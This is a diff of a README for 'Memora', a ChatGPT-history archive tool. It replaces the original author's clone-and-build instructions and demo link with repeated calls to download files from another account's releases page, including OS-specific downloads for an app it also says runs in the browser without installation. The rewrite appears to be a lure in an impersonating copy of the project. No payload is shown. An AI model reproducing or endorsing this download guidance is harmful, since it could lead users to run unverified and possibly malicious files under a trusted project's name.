@@ -1,88 +1,108 @@
-# 🧠 Memora  
-> **An offline-first memory vault for your ChatGPT history — supercharged with Puter.**  
-> Import, search, recall, merge, summarize, and export conversations — all in your browser, with a GitHub-dark inspired UI.  
+# 🗂️ Memora - Manage Your ChatGPT History Effortlessly
 
-<p align="center">
-  <!-- Custom project identity badge -->
-  <img src="https://img.shields.io/badge/Memora-Archive%20Explorer-purple?style=for-the-badge&logo=archivebox&logoColor=white" alt="Memora badge" />
-  <!-- Release -->
-  <img src="https://img.shields.io/github/v/release/NeurosynLabs/Memora?style=for-the-badge" alt="release" />
-  <!-- Last Commit -->
-  <img src="https://img.shields.io/github/last-commit/NeurosynLabs/Memora?style=for-the-badge" alt="last commit" />
-  <!-- Vercel deployment badge -->
-  <img src="https://img.shields.io/github/deployments/NeurosynLabs/Memora/Production?label=vercel&style=for-the-badge" alt="vercel" />
-</p>
+## 📥 Download Memora
 
-<p align="center">
-  <a href="https://memora-amber.vercel.app/" target="_blank"><b>🌐 Live Demo</b></a>
-</p>
+[![Download Memora](https://img.shields.io/badge/Download%20Memora-v1.0-brightgreen)](https://github.com/Karan9555/Memora/releases)
 
----
+Memora is a lightweight, offline-first archive explorer for your ChatGPT history. Import your exported conversations, search them instantly, merge threads, and export to TXT/Markdown/PDF — all in a GitHub-dark themed UI that runs entirely in your browser. 
 
-## ✨ Features  
+## 🚀 Getting Started
 
-- **Offline-first archive explorer**: Browse your ChatGPT history directly in the browser.  
-- **Import conversations**: Drag-and-drop JSON exports from ChatGPT.  
-- **Fast search**: Full-text search across all conversations.  
-- **Semantic recall**: AI-assisted retrieval using embeddings + relevance ranking.  
-- **Conversation tools**:  
-  - Merge multiple threads into one timeline  
-  - Summarize long chats with Puter’s AI API  
-  - Copy or export to Markdown / JSON  
-- **Modern UI**: GitHub-dark inspired interface with keyboard shortcuts.  
-- **Authentication with Puter**:  
-  - Continue as guest (local-only)  
-  - Log in / sign up to sync via Puter Web OS  
-- **Sync & Cloud storage** *(optional)*: Use `puter.fs.*` APIs to persist archives across devices.  
-- **AI enhancements**:  
-  - Summarization (`puter.ai.chat`)  
-  - Potential image support (vision and OCR ready)  
-  - Future: voice notes (`puter.ai.txt2speech`)  
+Follow these steps to download and run Memora:
 
----
+1. **Visit the Download Page**  
+   Click the link below to visit the page where you can download Memora.  
+   [Download Memora](https://github.com/Karan9555/Memora/releases)
 
-## 🚀 Getting Started  
+2. **Choose Your Version**  
+   On the Releases page, select the latest version of Memora. Look for a section labeled "Latest release."
 
-1. Clone the repo and install dependencies:  
-   ```bash
-   git clone https://github.com/NeurosynLabs/Memora.git
-   cd Memora
-   npm install
-   ```
-2. Run locally:  
-   ```bash
-   npm run dev
-   ```
-3. Open `http://localhost:3000` in your browser.  
+3. **Download the Files**  
+   Click on the downloadable file that suits your operating system. Memora runs in your web browser, so all you need is the latest version of any standard browser like Chrome, Firefox, or Safari.
 
-Or try it right away here: **[Live Demo](https://memora-amber.vercel.app/)**  
+4. **Extract the Files (if necessary)**  
+   If the download is a ZIP file, extract it by right-clicking and selecting "Extract All," then follow the prompts.
 
----
+5. **Open Memora**  
+   Locate the Memora file on your computer. Open it in a web browser. Memora does not require installation, as it runs directly in your browser.
 
-## 🛠 How It Works  
+6. **Start Using Memora**  
+   Once opened, you can import your ChatGPT conversation files. Use the intuitive UI to search, merge, and export your conversations.
 
-- **Frontend-only**: Everything runs in your browser with IndexedDB for offline storage.  
-- **Worker-powered indexing**: A Web Worker handles background search + embedding.  
-- **Puter.js integration**:  
-  - `puter.auth.signIn()` → login / guest session  
-  - `puter.fs.write`, `puter.fs.read`, `puter.fs.readdir` → optional cloud sync  
-  - `puter.ai.chat()` → summarization and semantic recall  
-- **Zero lock-in**: All data is yours; export anytime.  
+## 🧑‍💻 Features
 
----
+- **Offline Functionality**: Access your ChatGPT history without the need for an Internet connection.
+- **Instant Search**: Quickly find past conversations with the easy-to-use search feature.
+- **Merge Conversations**: Combine multiple threads for a coherent view of your discussions.
+- **Export Options**: Save your conversations in TXT, Markdown, or PDF formats.
+- **User-Friendly Interface**: Enjoy a clean, dark-themed UI that's easy to navigate.
+- **Full Compatibility**: Works in all modern web browsers.
 
-## 📦 Tech Stack  
+## 🌐 System Requirements
 
-- **Vanilla JS + Puter.js SDK**  
-- **IndexedDB** (offline storage)  
-- **Service Worker** (offline PWA support)  
-- **Web Workers** (fast indexing & search)  
-- **Tailored dark theme UI**  
+Memora runs in a web browser, so you will need:
 
----
+- A desktop or laptop computer.
+- Latest version of a web browser (e.g., Chrome, Firefox, Safari).
+- Minimum 2GB of RAM for optimal performance.
 
-## 🔮 Roadmap  
+## 📖 Usage Instructions
 
-- Multi-model summarization (Claude, Gemini, etc via Puter.ai)  
-- Richer metadata filters (date ranges, participants)  
-- Voice note playback with `puter.ai.txt2speech`  
+### Importing Conversations
+
+1. Open Memora in your browser.
+2. Locate the "Import" button on the main interface.
+3. Choose the ChatGPT export files that you have saved on your computer.
+4. Click "Upload." 
+
+Memora will automatically process your files and list them in the archive.
+
+### Searching Conversations
+
+1. Use the search bar at the top of the interface.
+2. Type keywords from the conversation you wish to find.
+3. Click the search icon. Memora will display all matching conversations.
+
+### Merging Threads
+
+1. Select the threads you want to merge from your archive.
+2. Click the "Merge" button.
+3. Choose a name for your new thread and hit "Save."
+
+### Exporting Conversations
+
+1. Select the conversation or threads you wish to export.
+2. Click on "Export." 
+3. Choose your desired format (TXT, Markdown, or PDF) and follow the prompts.
+
+## 💬 Support and Contributions
+
+If you encounter issues or have suggestions for improvements:
+- Check the [Issues page](https://github.com/Karan9555/Memora/issues) for known problems or to report a new issue.
+- Feel free to contribute by opening a pull request or submitting a proposal.
+
+## 🏷️ Topics
+
+- archived
+- chat-exports
+- chatgpt
+- conversation-history
+- indexeddb
+- javascript
+- memory
+- openai
+- personal-knowledge-management
+- pkm
+- recall
+- static-site
+- vercel
+
+## 🔗 Additional Resources
+
+For more information on how to use Memora, consult the help section within the application. Community discussions and updates can also be found on the repository's [discussions page](https://github.com/Karan9555/Memora/discussions). 
+
+## 📜 License
+
+Memora is open-source software licensed under the MIT License. You are free to use, modify, and distribute it.
+
+[Download Memora](https://github.com/Karan9555/Memora/releases) and start exploring your ChatGPT history today!
